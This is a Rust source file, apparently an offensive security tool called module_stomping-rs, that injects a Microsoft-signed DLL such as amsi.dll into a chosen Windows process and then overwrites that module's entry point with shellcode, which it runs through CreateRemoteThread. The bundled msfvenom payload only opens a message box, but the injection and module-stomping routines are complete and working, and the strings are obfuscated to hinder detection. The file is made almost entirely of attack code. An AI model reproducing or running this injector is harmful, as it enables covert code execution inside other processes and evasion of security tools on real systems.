use obfstr::obfstr;
use std::{env, mem::size_of, ptr::null_mut};
use windows_sys::Win32::{
    Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::{
            Debug::{ReadProcessMemory, WriteProcessMemory, IMAGE_NT_HEADERS64},
            ToolHelp::{
                CreateToolhelp32Snapshot, Module32First, Module32Next, Process32First,
                Process32Next, MODULEENTRY32, PROCESSENTRY32, TH32CS_SNAPMODULE,
                TH32CS_SNAPMODULE32, TH32CS_SNAPPROCESS,
            },
        },
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        SystemServices::{IMAGE_DOS_HEADER},
        Threading::{CreateRemoteThread, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS},
    },
};

// Could add this as an arg to download from a URL or read file of disk but meh...
//msfvenom -p windows/x64/messagebox -f rust
const BUF: [u8; 295] = [
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41,
    0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52,
    0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
    0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1,
    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e,
    0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
    0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
    0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d,
    0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
    0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b,
    0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c,
    0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
    0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
    0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7,
    0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x00, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
    0x85, 0x0f, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5,
    0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x65, 0x6c, 0x6c, 0x6f,
    0x2c, 0x20, 0x66, 0x72, 0x6f, 0x6d, 0x20, 0x4d, 0x53, 0x46, 0x21, 0x00, 0x4d, 0x65, 0x73, 0x73,
    0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x00,
];

fn main() {
    env_logger::init();

    let args: Vec<String> = env::args().collect();

    if args.len() < 4 {
        println!(r"Usage: .\module_stomping-rs.exe <process> <full dll path> <dll name>");
        println!(r"Example: .\module_stomping-rs.exe notepad.exe C:\Windows\System32\amsi.dll amsi.dll");
        std::process::exit(1);
    }

    let process_name = &args[1];
    let file_path = &args[2];
    let file_name = &args[3];

    log::info!("[+] Process: {}", process_name);
    log::info!("[+] Path: {}", file_path);

    let mut process = Process {
        process_name: process_name.to_owned(),
        process_id: 0,
        file_path: file_path.to_owned(),
        file_name: file_name.to_owned(),
        process_handle: 0,
        allocated_memory: 0,
    };

    // Inject a legitimate Microsoft signed DLL (e.g. amsi.dll)
    inject_dll(&mut process);

    // Inject the shellcode into the Microsoft Signed DLL inside the target process (e.g notepad.exe -> amsi.dll)
    inject_shellcode(&mut process);
}

struct Process {
    process_name: String,
    process_id: u32,
    file_path: String,
    file_name: String,
    process_handle: isize,
    allocated_memory: usize,
}

/// Injects a DLL inside the target process (Classic DLL Injection)
fn inject_dll(process: &mut Process) {
    process.process_id =
        get_process_id_by_name(&process.process_name).expect(obfstr!("Failed to get process ID"));

    process.process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process.process_id) };

    if process.process_handle == 0 {
        panic!("{}", obfstr!("[-] Error: failed to open process"));
    }

    process.allocated_memory = unsafe {
        VirtualAllocEx(
            process.process_handle,
            null_mut(),
            process.file_path.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        ) as _
    };

    log::info!("[+] Allocated Memory: {:#x}", process.allocated_memory);

    if process.allocated_memory == 0 {
        panic!(
            "{}",
            obfstr!("[-] Error: failed to allocate memory in the process")
        );
    }

    let mut tmp = 0;
    let wpm_result = unsafe {
        WriteProcessMemory(
            process.process_handle,
            process.allocated_memory as _,
            process.file_path.as_ptr() as _,
            process.file_path.len(),
            &mut tmp,
        )
    };

    if wpm_result == 0 {
        panic!(
            "{}",
            obfstr!("[-] Error: failed to write to process memory")
        );
    }

    let k32_address = unsafe { GetModuleHandleA(obfstr!("KERNEL32.DLL\0").as_ptr()) };

    if k32_address == 0 {
        panic!("{}", obfstr!("[-] Error: failed to get module handle"));
    }

    log::info!("[+] Kernel32 Address: {:#x}", k32_address);

    let loadlib_address = unsafe {
        GetProcAddress(k32_address, obfstr!("LoadLibraryA\0").as_ptr())
            .expect(obfstr!("Failed to get LoadLibraryA address"))
    };

    log::info!("[+] LoadLibraryA address: {:#x}", loadlib_address as usize);

    let mut tmp = 0;
    let dll_thread = unsafe {
        CreateRemoteThread(
            process.process_handle,
            null_mut(),
            0,
            Some(std::mem::transmute(loadlib_address as usize)),
            process.allocated_memory as _,
            0,
            &mut tmp,
        )
    };

    if dll_thread == 0 {
        panic!("{}", obfstr!("[-] Error: failed to create remote thread"));
    }

    log::info!("[+] {} DLL Injection Complete!", process.file_path);

    unsafe { WaitForSingleObject(dll_thread, 1000) };

    //unsafe { CloseHandle(dll_thread) };
}

fn inject_shellcode(process: &mut Process) {
    let module_base = get_module_base_by_name(&process.file_name, process.process_id)
        .expect(obfstr!("Failed to get module base address"));

    log::info!("[+] Module Base: {:p}", module_base);

    #[cfg(target_arch = "x86")]
    let remote_buffer_len = size_of::<IMAGE_DOS_HEADER>() + size_of::<IMAGE_NT_HEADERS32>();
    #[cfg(target_arch = "x86_64")]
    let remote_buffer_len = size_of::<IMAGE_DOS_HEADER>() + size_of::<IMAGE_NT_HEADERS64>();

    log::info!("[+] Remote Buffer Length: {:#x}", remote_buffer_len);

    let mut remote_buffer: Vec<u8> = vec![0; remote_buffer_len];

    let mut tmp = 0;
    let rpm_result = unsafe {
        ReadProcessMemory(
            process.process_handle,
            module_base as _,
            remote_buffer.as_mut_ptr() as _,
            remote_buffer_len,
            &mut tmp,
        )
    };

    if rpm_result == 0 {
        panic!("{}", obfstr!("[-] Error: failed to read process memory"));
    }

    log::info!("[+] Bytes Read: {}", tmp);
    //log::info!("Remote Buffer Content: {:?}", remote_buffer);

    // The 'remote_buffer' is a pointer to a vector in our current process and contains header information of the remote process Microsoft signed DLL
    // This header information was read via ReadProcessMemory
    let dos_header = remote_buffer.as_mut_ptr() as *mut IMAGE_DOS_HEADER;

    let nt_headers = unsafe {
        (remote_buffer.as_mut_ptr() as usize + (*dos_header).e_lfanew as usize)
            as *mut IMAGE_NT_HEADERS64
    };

    // The 'module_base' is the address of the Microsoft signed DLL in the target process
    let address_of_entry_pointer =
        unsafe { module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };

    log::info!("[+] IMAGE_DOS_HEADER: {:#p} ", dos_header);
    log::info!("[+] IMAGE_NT_HEADERS: {:#p}", nt_headers);
    log::info!("[+] AddressOfEntryPoint: {:#x}", address_of_entry_pointer);

    let mut tmp = 0;
    let wpm_result = unsafe {
        WriteProcessMemory(
            process.process_handle,
            address_of_entry_pointer as _,
            BUF.as_ptr() as _,
            BUF.len(),
            &mut tmp,
        )
    };

    if wpm_result == 0 {
        panic!(
            "{}",
            obfstr!("[-] Error: failed to write to process memory")
        );
    }

    let mut tmp = 0;
    let dll_thread = unsafe {
        CreateRemoteThread(
            process.process_handle,
            null_mut(),
            0,
            Some(std::mem::transmute(address_of_entry_pointer as usize)),
            null_mut(),
            0,
            &mut tmp,
        )
    };

    if dll_thread == 0 {
        panic!("{}", obfstr!("[-] Error: failed to create remote thread"));
    }

    unsafe { CloseHandle(dll_thread) };
    unsafe { CloseHandle(process.process_handle) };
}

/// Gets the process ID by name, take process name as a parameter
fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if h_snapshot == INVALID_HANDLE_VALUE {
        return Err(obfstr!("Failed to call CreateToolhelp32Snapshot").to_owned());
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
        return Err(obfstr!("Failed to call Process32First").to_owned());
    }

    loop {
        if convert_c_array_to_rust_string(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase()
        {
            break;
        }

        if unsafe { Process32Next(h_snapshot, &mut process_entry) } == 0 {
            return Err(obfstr!("Failed to call Process32Next").to_owned());
        }
    }

    return Ok(process_entry.th32ProcessID);
}

/// Gets the base address of a module inside a process by name, take module name and process ID as a parameter.
fn get_module_base_by_name(module_name: &str, process_id: u32) -> Result<*mut u8, String> {
    let h_snapshot =
        unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, process_id) };

    if h_snapshot == INVALID_HANDLE_VALUE {
        return Err(obfstr!("Failed to call CreateToolhelp32Snapshot").to_owned());
    }

    let mut module_entry: MODULEENTRY32 = unsafe { std::mem::zeroed::<MODULEENTRY32>() };
    module_entry.dwSize = size_of::<MODULEENTRY32>() as u32;

    if unsafe { Module32First(h_snapshot, &mut module_entry) } == 0 {
        return Err(obfstr!("Failed to call Module32First").to_owned());
    }

    loop {
        if convert_c_array_to_rust_string(module_entry.szModule.to_vec()).to_lowercase()
            == module_name.to_lowercase()
        {
            break;
        }

        if unsafe { Module32Next(h_snapshot, &mut module_entry) } == 0 {
            return Err(obfstr!("Failed to call Module32Next").to_owned());
        }
    }

    return Ok(module_entry.modBaseAddr);
}

/// Converts a C null terminated String to a Rust String
pub fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}
